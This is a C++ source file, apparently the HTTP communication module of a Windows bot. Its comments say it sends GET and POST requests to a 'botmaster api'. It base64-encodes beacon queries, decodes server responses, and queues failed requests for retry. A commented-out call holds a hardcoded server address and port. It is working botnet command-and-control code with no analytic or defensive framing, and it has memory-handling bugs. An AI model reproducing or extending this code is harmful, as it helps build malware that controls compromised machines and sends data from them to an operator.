#include "curl.h"
#include <wininet.h>
#include <tchar.h>
#include <string>
#include "HttpLib.h"
#include "UtilLib.h"
#include <iostream>

using namespace std;

string httpPostRequest(string url, string api, int port, char* args, int len){
	string response = "";

	HINTERNET hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hInternet == NULL){}
	else{
		HINTERNET hConnect = InternetConnectW(hInternet, s2ws(url).c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);

		if (hConnect == NULL){}
		else
		{
			const wchar_t* parrAcceptTypes[] = { L"text/*", NULL };
			HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", s2ws(api).c_str(), NULL, NULL, parrAcceptTypes, 0, 0);

			if (hRequest == NULL){}
			else{
				LPCWSTR hdrs = L"Content-Type: application/x-www-form-urlencoded";

				char* encodedQuery = NULL;
				if(encode){
					int encodedQueryStart = 8;
					int contentsIndex = nStrFind(args, "&contents", len);
					if(contentsIndex > 0){
						int dataThatWontBeEncoded = len - contentsIndex;
						char* safeToEncodePart = new char[contentsIndex];
						memset(safeToEncodePart, 1, contentsIndex);
						memcpy(safeToEncodePart, args, contentsIndex);
						string encodedStrPart = base64_encode((unsigned char*)safeToEncodePart, contentsIndex);

						encodedQuery = new char[encodedQueryStart + encodedStrPart.size() + dataThatWontBeEncoded];
						strncpy(encodedQuery, "request=", encodedQueryStart);
						memcpy(encodedQuery + encodedQueryStart, encodedStrPart.c_str(), encodedStrPart.size());
						memcpy(encodedQuery + encodedQueryStart + encodedStrPart.size(),
									 args + contentsIndex, dataThatWontBeEncoded);
						args = encodedQuery;
						len = encodedQueryStart + encodedStrPart.size() + dataThatWontBeEncoded;
					}else{
						// encode the standard query in base 64
						string encodedStr = base64_encode((unsigned char*)args, len);
						// an array for the encoded query, it will wrap the standard query in a 'request=xxxxxxx'
						encodedQuery = new char[encodedStr.size() + encodedQueryStart];
						strncpy(encodedQuery, "request=", encodedQueryStart);
						memcpy(encodedQuery + encodedQueryStart, encodedStr.c_str(), encodedStr.size());
						args = encodedQuery;
						len = encodedQueryStart + encodedStr.size();
					}
				}

				BOOL bRequestSent = HttpSendRequestW(hRequest, hdrs, wcslen(hdrs), args, len);
				delete encodedQuery;

				if (!bRequestSent){}
				else{
					const int nBuffSize = 1024;
					char buff[nBuffSize];

					BOOL bKeepReading = true;
					DWORD dwBytesRead = -1;

					while (bKeepReading && dwBytesRead != 0){
						bKeepReading = InternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);
						response.append(buff, dwBytesRead);
					}
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
	return response;
}


string httpGetRequest(string url, string api, int port, char* args){
	// string variable to store the response from the server
	string response = "";
	string queryArgs(args);
	if(encode){
		// encode the standard query in base 64
		// len - 1 to drop the '\0' since hex will no longer be a string, ie no null term
		int len = strlen(args) - 1;
		// args + 1 since the args will include the ? for the get, we dont want that encoded
		queryArgs = "?request=" + base64_encode((unsigned char*)args + 1, len);
	}
	// append the query string '?args=value..." to the end of the url
	wstring wapi = s2ws(api) + s2ws(queryArgs);

	HINTERNET hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hInternet == NULL){}
	else{

		HINTERNET hConnect = InternetConnectW(hInternet, s2ws(url).c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);

		if (hConnect == NULL){}
		else{
			const wchar_t* parrAcceptTypes[] = { L"text/*", NULL };
			HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", wapi.c_str(), NULL, NULL, parrAcceptTypes, INTERNET_FLAG_NO_CACHE_WRITE, 0);

			if (hRequest == NULL){}
			else
			{
				LPCWSTR hdrs = L"Content-Type: application/x-www-form-urlencoded";

				BOOL bRequestSent = HttpSendRequestW(hRequest, hdrs, wcslen(hdrs), NULL, 0);

				if (!bRequestSent){}
				else{
					const int nBuffSize = 1024;
					char buff[nBuffSize];

					BOOL bKeepReading = true;
					DWORD dwBytesRead = -1;

					while (bKeepReading && dwBytesRead != 0){
						bKeepReading = InternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);
						response.append(buff, dwBytesRead);
					}

					// if the response starts with 'response=' it must be an encoded res
					if(response.find("response=") == 0){
						response = base64_decode(response.substr(9));
					}
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
	return response;
}

// string httpPostRequest(string url, string api, int port, char *args){
// 	string response = "";
//
// 	HINTERNET hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
//
// 	if (hInternet == NULL){}
// 	else{
// 		HINTERNET hConnect = InternetConnectW(hInternet, s2ws(url).c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
//
// 		if (hConnect == NULL){}
// 		else
// 		{
// 			const wchar_t* parrAcceptTypes[] = { L"text/*", NULL };
// 			HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", s2ws(api).c_str(), NULL, NULL, parrAcceptTypes, 0, 0);
//
// 			if (hRequest == NULL){}
// 			else{
// 				LPCWSTR hdrs = L"Content-Type: application/x-www-form-urlencoded";
//
// 				BOOL bRequestSent = HttpSendRequestW(hRequest, hdrs, wcslen(hdrs), args, strlen(args));
//
// 				if (!bRequestSent){}
// 				else{
// 					const int nBuffSize = 1024;
// 					char buff[nBuffSize];
//
// 					BOOL bKeepReading = true;
// 					DWORD dwBytesRead = -1;
//
// 					while (bKeepReading && dwBytesRead != 0){
// 						bKeepReading = InternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);
// 						response.append(buff, dwBytesRead);
// 					}
// 				}
// 				InternetCloseHandle(hRequest);
// 			}
// 			InternetCloseHandle(hConnect);
// 		}
// 		InternetCloseHandle(hInternet);
// 	}
// 	return response;
// }

//sends a post request to the botmaster api
void sendP_Request(string url, int port, string api, vector<vector<string>> &requestQueue, string postArgs, int wait){
	waitForPeriod(wait);
	printf("POST query is: %s\n", postArgs.c_str());
	if (postArgs != "err"){
		char* queryArray = new char[postArgs.size()];
		memset(queryArray, 0, postArgs.size());
		strncpy(queryArray, postArgs.c_str(), postArgs.size());
		string postRes = httpPostRequest(url, api, port, queryArray, postArgs.size());
		delete queryArray;
		if (postRes == ""){
			string requestParams = "";
			if(&requestQueue != NULL){
				requestParams.append(postArgs);
				queueRequest(requestQueue, api, requestParams);
			}
		}
	}
}

//sends a get request to the botmaster api
string sendG_Request(string url, int port, string api, vector<vector<string>> &requestQueue, string getQuery, int wait){
	waitForPeriod(wait);
	string response = "-1";
	//string query = getArgsToString(keys, values, getSize(keys), params, getSize(params), "GET");
	// if the query string was formed correctly
	char* queryArray = new char[getQuery.size() + 1];
	memset(queryArray, 0, getQuery.size() + 1);
	strncpy(queryArray, getQuery.c_str(), getQuery.size());
	response = httpGetRequest(url, api, port, queryArray);
	delete queryArray;	// free the memory for this array
	printf("GET response is: %s\n", response.c_str());
	// if no data was returned
	if (response != "400"){
		string requestParams = "";
		requestParams.append(getQuery);
		queueRequest(requestQueue, api, requestParams);
	}
	return response;
}

//void sendP_Request(vector<vector<string>> &requestQueue, vector<string> keys, vector<string> values, vector<string> params, string api, string data){
//	char* query = NULL;
//	if (data.compare("")){
//		params.push_back("data");
//		keys.push_back("data");
//		values.push_back(data);
//	}
//	getArgsToString(keys, values, getSize(keys), params, getSize(params), "POST", &query);
//	if (strcmp(query, "err") != 0){
//		char* postRes = httpPostRequest("70.61.16.8", api, 50000, query);
//		if (strcmp(postRes, "") == 0){
//			string requestParams = "";
//			requestParams.append(query);
//			queueRequest(requestQueue, api, requestParams);
//		}
//		delete[] postRes;
//	}
//}
